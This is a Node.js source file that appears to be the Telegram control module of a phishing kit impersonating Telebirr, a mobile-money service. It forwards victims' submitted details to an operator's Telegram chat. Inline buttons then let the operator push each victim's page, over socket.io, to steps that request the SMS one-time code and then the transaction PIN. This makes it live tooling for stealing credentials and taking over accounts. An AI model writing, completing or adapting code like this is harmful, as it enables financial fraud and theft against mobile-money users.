require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.ADMIN_CHAT_ID;

// Initialize the Telegram Bot Engine using webhook mode
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

/**
 * Strips out characters that break Telegram Markdown parsing
 */
function escapeMarkdown(text) {
    if (!text) return '';
    return String(text).replace(/([_*\[\]()~`>#+=|{}.!])/g, '\\$1');
}

/**
 * Dispatches active profiles to the Admin Telegram channel
 */
function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
    if (!CHAT_ID) return;

    let detailedFields = '';
    if (data && typeof data === 'object') {
        Object.entries(data).forEach(([key, val]) => {
            if (val !== undefined && val !== null && val !== '') {
                detailedFields += `• *${escapeMarkdown(key)}:* \`${escapeMarkdown(val)}\`\n`;
            }
        });
    } else if (data) {
        detailedFields += `• *Data Payload:* \`${escapeMarkdown(data)}\`\n`;
    }

    const message = `
📱 *Telebirr Session:* \`${escapeMarkdown(appId)}\`
━━━━━━━━━━━━━━━━━━━━━━━━
📢 *${escapeMarkdown(stepTitle)}*
━━━━━━━━━━━━━━━━━━━━━━━━
${detailedFields}━━━━━━━━━━━━━━━━━━━━━━━━
Status: *Awaiting Verification Approval*
    `.trim();

    const options = { parse_mode: 'Markdown' };

    if (requireInlineButtons) {
        let inlineActionPattern = "";
        let inlineActionButtonText = "";

        if (stepTitle.includes("Step 1")) {
            inlineActionPattern = "step1_approve";
            inlineActionButtonText = "📩 REQUEST SMS OTP";
        } else if (stepTitle.includes("Step 2")) {
            inlineActionPattern = "step2_approve";
            inlineActionButtonText = "✅ VERIFY OTP & ASK PIN";
        } else if (stepTitle.includes("Step 3")) {
            inlineActionPattern = "step3_approve";
            inlineActionButtonText = "🔓 CLEAR TRANSACTION PIN";
        }

        if (inlineActionPattern !== "") {
            options.reply_markup = {
                inline_keyboard: [[
                    { text: inlineActionButtonText, callback_data: `${inlineActionPattern}:${appId}` }
                ]]
            };
        }
    } else {
        // Change status for informational passive collection cards
        options.text = message.replace("Status: *Awaiting Verification Approval*", "Status: *Log Collected (Passive)*");
    }

    bot.sendMessage(CHAT_ID, message, options)
        .then(() => console.log(`✅ [TELEGRAM] Data block dispatched to admin channel for: ${appId}`))
        .catch((err) => console.error(`❌ [TELEGRAM ERROR] Delivery failure tracking profile ID ${appId}:`, err.message));
}

// Telegram Inline Interactive Webhook Processing Engine
bot.on('callback_query', async (callbackQuery) => {
    const actionData = callbackQuery.data;
    const message = callbackQuery.message;
    
    if (!actionData) return;
    
    const [actionSignal, targetAppId] = actionData.split(':');
    let auditLogExecutionState = '';
    
    if (!global.io) {
        console.error("❌ [BOT MANAGER ERROR] global.io context mapping configuration is missing.");
        return;
    }

    switch (actionSignal) {
        case 'step1_approve':
            // Advances client from Step 1 to Step 2 input
            global.io.to(targetAppId).emit('otp-accepted-goto-wait');
            auditLogExecutionState = "✅ Step 1 Verified: App shifted user view to SMS verification layout.";
            break;

        case 'step2_approve':
            // Advanced client from Step 2/2.5 wait layout to Step 3 transaction PIN input
            global.io.to(targetAppId).emit('admin-dashboard-approve');
            auditLogExecutionState = "✅ Step 2 Verified: Code checked successfully. Prompted transaction PIN access.";
            break;

        case 'step3_approve':
            // Clears transaction PIN, advances client to Step 4 form
            global.io.to(targetAppId).emit('final-pin-accepted');
            auditLogExecutionState = "✅ Step 3 Verified: Security credentials confirmed. Configuration matrix unlocked.";
            break;

        default:
            auditLogExecutionState = "⚠️ Action event parsing returned unknown data types.";
    }

    // Update the administrative card view inside Telegram to prevent double clicks
    try {
        await bot.editMessageText(`${message.text}\n\n🤖 *Audit Log Execution State:*\n_${escapeMarkdown(auditLogExecutionState)}_`, {
            chat_id: CHAT_ID,
            message_id: message.message_id,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard: [] }
        });
    } catch (e) {
        console.error("❌ [TELEGRAM UI UPDATE ERROR]", e.message);
    }
});

module.exports = {
    bot,
    sendToAdmin
};